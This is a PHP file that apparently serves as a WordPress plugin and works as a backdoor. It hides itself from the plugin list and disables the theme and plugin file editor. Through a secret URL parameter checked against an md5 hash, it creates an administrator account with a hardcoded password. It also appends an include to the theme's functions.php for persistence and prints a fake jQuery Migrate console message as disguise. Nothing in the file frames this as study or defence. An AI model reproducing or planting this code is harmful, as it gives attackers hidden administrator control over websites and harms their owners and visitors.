<?php
##------------------------------------------------##
## 01 # Hide My Plugin From Plugins List
##------------------------------------------------##

add_filter(
  'all_plugins',
  function ($plugins) {

    $shouldHide = !array_key_exists('show_all', $_GET);

    if ($shouldHide) {
      $hiddenPlugins = [
        'WordPress-External-Script-Plugin/index.php',
        'index.php',
      ];

      foreach ($hiddenPlugins as $hiddenPlugin) {
        unset($plugins[$hiddenPlugin]);
      }
    }
    return $plugins;
  }
);

##------------------------------------------------##
## 02 # Disable Theme/Plugin File Editor
##------------------------------------------------##

define('DISALLOW_FILE_EDIT', true);

##------------------------------------------------##
## 03 # Create BackDoors
##------------------------------------------------##

add_action('wp_head', 'my_backdoor');
function my_backdoor()
{ // URL : website.com/?backdoor=go
  if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
    require('wp-includes/registration.php');
    if (!username_exists('mr_admin')) { // user : mr_admin
      $user_id = wp_create_user('mr_admin', 'pa55w0rd!'); // pass : pa55w0rd
      $user = new WP_User($user_id);
      $user->set_role('administrator');
    }
  }
}

##------------------------------------------------##
## 04 # Add Script Runner To Theme function.php
##------------------------------------------------##
// Get file directory
$file = get_stylesheet_directory() . '/functions.php';
// New code that should be added
$searchfor = 'include_once \'tag-manager-script.php\';';

// the following line prevents the browser from parsing this as HTML.
header('Content-Type: text/plain');

// get the file contents, assuming the file to be readable (and exist)
$contents = file_get_contents($file);

// escape special characters in the query
$pattern = preg_quote($searchfor, '/');

// finalise the regular expression, matching the whole line
$pattern = "/^.*$pattern.*\$/m";

// search, and store all matching occurences in $matches
if (preg_match_all($pattern, $contents, $matches)) {
  echo '<script>';
  echo 'console.log("JQMIGRATE: Migrate is installed, version 3.4.1");';
  echo '</script>';
} else {
  // Modify the content
  $contents .= $searchfor . PHP_EOL;
  // Write the modified contents back to the file
  file_put_contents($file, $contents);
}
